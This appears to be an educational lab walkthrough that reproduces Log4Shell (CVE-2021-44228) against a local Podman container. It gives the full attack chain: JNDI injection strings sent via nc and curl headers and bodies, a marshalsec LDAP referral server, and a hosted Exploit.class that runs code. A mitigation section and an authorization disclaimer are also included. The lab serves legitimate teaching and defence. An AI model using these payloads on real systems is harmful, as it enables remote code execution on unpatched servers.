# Log4Shell (CVE-2021-44228) Educational Exploit Walkthrough

## Overview
This walkthrough demonstrates the Log4Shell vulnerability for educational purposes. You'll learn how JNDI injection works and how to achieve Remote Code Execution (RCE).

## Prerequisites
- **Podman** installed (replaces Docker)
- **Python 3** (for HTTP server)
- **Java 8+** (for LDAP server)
- **netcat (nc)** for sending TCP payloads
- Local repository with vulnerable Log4j 2.14.1

## Podman vs Docker

This setup uses **Podman** instead of Docker. The commands are nearly identical:

| Docker Command | Podman Command |
|----------------|----------------|
| `docker build` | `podman build` |
| `docker run`   | `podman run`   |
| `docker ps`    | `podman ps`    |
| `docker exec`  | `podman exec`  |
| `docker stop`  | `podman stop`  |

Podman is rootless by default and doesn't require a daemon, making it more secure for educational environments.

## Makefile Commands

All Podman commands are wrapped in convenient Makefile targets:

```bash
make help              # Show all available commands
make build             # Build vulnerable container with Podman
make exploit-setup     # Setup exploit environment
make http-server       # Start HTTP server
make ldap-server       # Start LDAP server (auto-detects IP)
make vulnerable-server # Run vulnerable app with Podman
make clean             # Stop all services
```

## What You've Built

### 1. Vulnerable Server Container
- Built with `podman build -t log4jcve .`
- Runs a simple TCP server on port 8080
- Logs all incoming requests using vulnerable Log4j 2.14.1

### 2. Malicious Payload (`exploit/Exploit.class`)
This Java class executes when loaded by the vulnerable application:
- Installs cowsay package
- Creates `/tmp/exploit.txt` with execution proof
- Runs cowsay with "You have been pwned by Log4Shell!"

### 3. HTTP Server (Port 8888)
Hosts the malicious `Exploit.class` file for the JNDI lookup to fetch

### 4. LDAP Referral Server
Marshalsec provides an LDAP server that redirects JNDI lookups to your HTTP server

## Understanding the Vulnerability

### How Log4Shell Works:

1. **JNDI Lookup**: Log4j 2.x performs string substitution for patterns like `${jndi:ldap://...}`
2. **Remote Class Loading**: When Log4j encounters this pattern, it:
   - Connects to the LDAP server
   - Receives a reference to an HTTP URL
   - Downloads and executes the Java class from that URL
3. **Code Execution**: The static initializer in `Exploit.class` runs with the application's privileges

## Quick Start with Makefile

The easiest way to run the exploit is using the Makefile:

```bash
# View all available commands
make help

# Build everything (only needed once)
make build
make exploit-setup
```

Then open **3 separate terminals**:

**Terminal 1 - HTTP Server:**
```bash
make http-server
```

**Terminal 2 - LDAP Server:**
```bash
make ldap-server
# Or specify custom IP: HOST_IP=192.168.1.100 make ldap-server
```

**Terminal 3 - Vulnerable Server:**
```bash
make vulnerable-server
```

**Terminal 4 - Exploit:**
```bash
# Get your IP (auto-detected by Makefile)
hostname -I | awk '{print $1}'

# Send exploit
echo '${jndi:ldap://192.168.1.100:1389/Exploit}' | nc localhost 8080
```

## Step-by-Step Exploitation (Manual Method)

### Step 1: Build the Vulnerable Container
```bash
# Using Makefile
make build

# Or manually with Podman
podman build -t log4jcve .
```

### Step 2: Setup Exploit Environment (First Time Only)
```bash
# Using Makefile (recommended)
make exploit-setup

# Or manually
cd exploit
git clone https://github.com/mbechler/marshalsec.git
cd marshalsec
podman run --rm -v $(pwd):/marshalsec:Z -w /marshalsec maven:3.8.4-jdk-8 mvn clean package -DskipTests
cd ..
podman run --rm -v $(pwd):/exploit:Z maven:3.8.4-jdk-8 javac /exploit/Exploit.java
```

### Step 3: Start the HTTP Server

**Using Makefile:**
```bash
make http-server
```

**Or manually:**
```bash
cd exploit
python3 -m http.server 8888
```

**Test it:**
```bash
curl -I http://localhost:8888/Exploit.class
```

### Step 4: Start the LDAP Referral Server

Get your host IP:
```bash
hostname -I | awk '{print $1}'
# Example output: 192.168.1.100
```

**Using Makefile (auto-detects IP):**
```bash
make ldap-server
# Or with custom IP: HOST_IP=192.168.1.100 make ldap-server
```

**Or manually:**
```bash
cd exploit/marshalsec
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://192.168.1.100:8888/#Exploit" 1389
```

**Replace `192.168.1.100` with your actual host IP**

You should see:
```
Listening on 0.0.0.0:1389
```

### Step 5: Run the Vulnerable Application

Open a new terminal and start the container:

**Using Makefile:**
```bash
make vulnerable-server
```

**Or manually with Podman:**
```bash
podman run --rm -p 8080:8080 --network=host log4jcve
```

**Note**: `--network=host` allows the container to access your host's LDAP server on port 1389

You should see:
```
Vulnerable server listening on port 8080
```

### Step 6: Exploit the Vulnerability

Open another terminal and send the malicious payload:

```bash
# Replace YOUR_HOST_IP with your actual IP (e.g., 192.168.1.100)
echo '${jndi:ldap://YOUR_HOST_IP:1389/Exploit}' | nc localhost 8080
```

**Example:**
```bash
echo '${jndi:ldap://192.168.1.100:1389/Exploit}' | nc localhost 8080
```

### Step 7: Observe the Exploit

**In the marshalsec terminal**, you'll see:
```
Send LDAP reference result for Exploit redirecting to http://192.168.1.100:8888/Exploit.class
```

**In the HTTP server terminal**, you'll see:
```
GET /Exploit.class HTTP/1.1
```

**In the vulnerable app terminal**, you'll see the Log4j attempting the JNDI lookup

### Step 8: Verify RCE

Check if the exploit executed inside the container:
```bash
# Get the container ID
podman ps

# Execute a shell in the running container
podman exec -it <container_id> /bin/bash

# Inside the container, check the exploit output
cat /tmp/exploit.txt
```

You should see cowsay output and execution proof!

## Alternative: Simpler curl-based Exploit

Instead of `nc`, you can use curl with a custom header:
```bash
curl -H "X-Api-Version: \${jndi:ldap://192.168.1.100:1389/Exploit}" http://localhost:8080/
```

## Understanding the Attack Chain

```
┌─────────────┐      ┌──────────────┐      ┌─────────────┐      ┌──────────────┐
│   Attacker  │─────>│  Vulnerable  │─────>│    LDAP     │─────>│     HTTP     │
│             │ JNDI │   Log4j App  │ Ref  │   Server    │Class │    Server    │
└─────────────┘      └──────────────┘      └─────────────┘      └──────────────┘
                              │                                          │
                              │                                          │
                              └──────────< Downloads Exploit.class <─────┘
                              │
                              ▼
                        [Code Execution]
                     Install cowsay, run commands
```

## Key Curl Commands Summary

1. **Test HTTP server is serving the payload:**
   ```bash
   curl -I http://localhost:8888/Exploit.class
   ```

2. **Send exploit via TCP:**
   ```bash
   echo '${jndi:ldap://192.168.1.100:1389/Exploit}' | nc localhost 8080
   ```

3. **Send exploit via HTTP header:**
   ```bash
   curl -H "User-Agent: \${jndi:ldap://192.168.1.100:1389/Exploit}" http://localhost:8080/
   ```

4. **Send exploit via HTTP body:**
   ```bash
   curl -X POST -d "\${jndi:ldap://192.168.1.100:1389/Exploit}" http://localhost:8080/
   ```

## Defense Mechanisms

To protect against this vulnerability:

1. **Upgrade Log4j**: Use version 2.15.0 or later
   - Edit `pom.xml` and change version to `2.15.0`

2. **Set JVM property**:
   ```bash
   java -Dlog4j2.formatMsgNoLookups=true ...
   ```

3. **Set environment variable**:
   ```bash
   export LOG4J_FORMAT_MSG_NO_LOOKUPS=true
   ```

4. **Remove JndiLookup class**:
   ```bash
   zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class
   ```

## Educational Notes

### Why is this vulnerability so severe?

1. **Ubiquity**: Log4j is used in countless Java applications
2. **Easy to exploit**: Just inject a string into any logged field
3. **Remote Code Execution**: Full control of the application
4. **No authentication required**: Attacks can come from unauthenticated users

### Common attack vectors:

- HTTP headers (User-Agent, X-Forwarded-For, etc.)
- Form fields
- URL parameters
- WebSocket messages
- Any input that gets logged

### Real-world impact:

- Apache Struts
- Apache Solr
- Apache Druid
- VMware vCenter
- Minecraft servers
- Many cloud services

## Cleanup

**Using Makefile (easiest):**
```bash
make clean
```

**Or manually:**
```bash
# Stop the vulnerable container
podman stop $(podman ps -q --filter ancestor=log4jcve)

# Stop the HTTP server
pkill -f "python3 -m http.server 8888"

# Stop marshalsec (Ctrl+C in its terminal or)
pkill -f "marshalsec.jndi.LDAPRefServer"
```

## References

- [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)
- [Apache Log4j Security Vulnerabilities](https://logging.apache.org/log4j/2.x/security.html)
- [Marshalsec](https://github.com/mbechler/marshalsec)

---

**Remember**: This is for educational purposes only. Never test exploits on systems you don't own or have explicit permission to test.
